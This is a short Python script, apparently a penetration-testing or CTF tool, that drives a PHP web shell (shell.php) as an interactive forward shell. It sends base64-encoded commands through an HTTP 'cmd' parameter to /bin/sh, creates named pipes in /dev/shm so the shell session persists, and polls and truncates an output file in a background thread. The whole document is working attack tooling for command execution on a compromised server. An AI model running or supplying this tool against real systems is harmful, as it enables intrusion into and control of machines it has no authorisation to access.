#!/bin/python3
import sys,os,signal, time, requests, threading
from base64 import b64encode
from random import randrange

class allTheReads(object):
    def __init__(self, interval=1):
         self.interval = interval

    def executing(self):
        thread = threading.Thread(target=self.run)
        thread.daemon = True
        thread.start()

    def run(self):
        deleteFile = '/usr/bin/truncate -s 0 {}'.format(stdout)
        readFile = '/usr/bin/strings {}'.format(stdout)

        while True:
            output = runCmd(readFile)

            if output:
                runCmd(deleteFile)

                print(output)
            time.sleep(self.interval)   
          
def handler(signal,frame):
    print("\n\n Exiting ..")
    sys.exit(0)

signal.signal(signal.SIGINT, handler)

def runCmd(cmd):
    cmd = cmd.encode('utf-8')
    cmd = b64encode(cmd).decode()
    payload={
          'cmd':' echo {} | base64 -d | /bin/sh '.format(cmd)
    }
    
    req = requests.get("http://127.0.0.1/shell.php",params=payload,timeout=5)
    
    return req.text

def writeCmd(cmd):

    cmd = cmd.encode('utf-8')
    cmd = b64encode(cmd).decode('utf-8')
    payload={
        'cmd':'echo {} | base64 -d > {}'.format(cmd,stdin)
    }
    
    result = (requests.get('http://127.0.0.1/shell.php',params=payload,timeout=5).text).strip()
    print(result)
   
def readCmd():
    getOuput = '/usr/bin/cat {}'.format(stdout)
    print(runCmd(getOuput))

def setupShell():
   
    namesPipe = 'mkfifo {}; tail -f {} | /bin/sh 2>&1 > {}'.format(stdin,stdin,stdout)
    
    try:
       runCmd(namesPipe)
    except:
        None
    return None

global stdin, stdout

session = randrange(1000,9999)

stdin = '/dev/shm/input{}'.format(str(session))
stdout = '/dev/shm/output{}'.format(str(session))



setupShell()
newObject = allTheReads()
newObject.executing()

while True:
    command=input("$~ ")
    writeCmd(command + "\n")
    time.sleep(1.1)    
